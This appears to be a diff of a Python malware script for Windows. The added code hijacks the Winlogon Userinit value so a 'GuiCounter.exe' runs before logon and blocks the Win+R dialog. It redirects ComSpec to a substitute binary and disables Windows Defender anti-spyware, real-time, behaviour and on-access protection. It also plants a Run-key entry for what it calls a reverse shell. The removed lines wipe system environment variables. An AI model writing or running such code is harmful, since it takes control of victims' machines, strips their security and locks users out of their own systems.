@@ -1,41 +1,55 @@
 #!/usr/bin/python
 #coding:utf-8
 import os, sys, time, winreg
-
-# READ A REG IN THE REGISTER
-def read_reg():
-    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Control\Session Manager\Environment',0, winreg.KEY_READ)
+# ENVIRONMENT VARIABLE
+usr = os.environ["USERNAME"]
+d = os.environ["SystemDrive"]
+# WRITE A REG FOR BLOCK WIN + R Execution
+def noRun():
+    norun = "REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f"
+    os.system(norun)
+# FUNCTION TO DELETE USERINIT IN WINDOWS REGISTRY
+def delInit():
+    delc = 'REG DELETE "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit /f'
+    os.system(delc)
+# WRITE A REG FOR THE GUI COUNTER TO STARTUP BEFORE LOGON ON WINDOWS
+def setInit():
+    p = "{}\\Users\\{}\\AppData\\gui_counter\\GuiCounter.exe, {}\\Windows\\system32\\userinit.exe".format(d, usr, d)
+    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
+    winreg.SetValueEx(key, 'Userinit',0, winreg.REG_SZ, p)
     winreg.CloseKey(key)
-
-# FUNCTION TO DELETE A REG ENVIRONMENT IN THE REGISTER
-def delRules():
-    aKey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment",0, winreg.KEY_ALL_ACCESS)
-    for keys in range(0, 1024):
-        try:
-            keyname = winreg.EnumValue(aKey, keys)
-            key, value, id = (keyname)
-            cmd = '/windows/system32/reg.exe delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v %s /f' %(key)
-            os.system(cmd)
-            time.sleep(3)
-        except OSError:
-            pass
-
-# WRITE A REG IN THE REGISTER
-def setRef():
-    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun')
-    winreg.SetValueEx(key, '1',0, winreg.REG_SZ, 'calculator.exe' )
+# DELETE CMD KEY FOR NEW REGISTRY
+def delcmd():
+    delc = 'REG DELETE "HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\Environment" /v ComSpec /f'
+    os.system(delc)
+# SET NEW KEY FOR NEW CMD PATH DIRECTORY
+def setCmd():
+    sr = "%SystemRoot%"
+    p = "{}\\windows\\system\\c.exe".format(sr)
+    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'System\\CurrentControlSet\\Control\\Session Manager\\Environment')
+    winreg.SetValueEx(key, 'ComSpec',0, winreg.REG_EXPAND_SZ, p)
     winreg.CloseKey(key)
-
-# FUNCTION TO DELETE A WINDIR REG IN THE ENVIRONMENT PATH
-def delWindir():
-    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment',0, winreg.KEY_SET_VALUE)
-    winreg.DeleteKey(key, 'windir')
+# DISABLE WINDOWS DEFENDER ANTI SPYWARE
+def spy():
+    dwin = 'REG add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'
+    os.system(dwin)
+# DISABLE WINDOWS DEFENDER SCAN REAL TIME PROTECTION
+def scanRtime():
+    dwin = 'REG add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f'
+    os.system(dwin)
+# DISABLE WINDOWS DEFENDER BEHAVIOR MONITORING
+def bMonitor():
+    dwin = 'REG add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f'
+    os.system(dwin)
+# DISABLE WINDOWS DEFENDER ACCESS
+def onAccess():
+    dwin = 'REG add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f'
+    os.system(dwin)
+#####################################################################
+# WRITE A REG FOR THE REVERSE SHELL IN THE REGISTER (NOT IMPLEMENTED)
+def setRv():
+    p = "\\Users\\%s\\AppData\\gui_counter\\rvMs32\\rvMs32.exe" %(usr)
+    c = "{}{}".format(d, p)
+    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
+    winreg.SetValueEx(key, 'rvMs',0, winreg.REG_SZ, c)
     winreg.CloseKey(key)
-
-# FUNCTION TO DELETE A SPECIAL REG ENVIRONMENT IN THE REGISTER
-def delSpecRules():
-    regs = ['TEMP', 'USERNAME', 'windir', 'OS', 'PATHEXT', 'PATH', 'PSModulePath']
-    for reg in regs:
-        cmd = '/windows/system32/reg.exe delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v %s /f' %(reg)
-        os.system(cmd)
-        time.sleep(2)
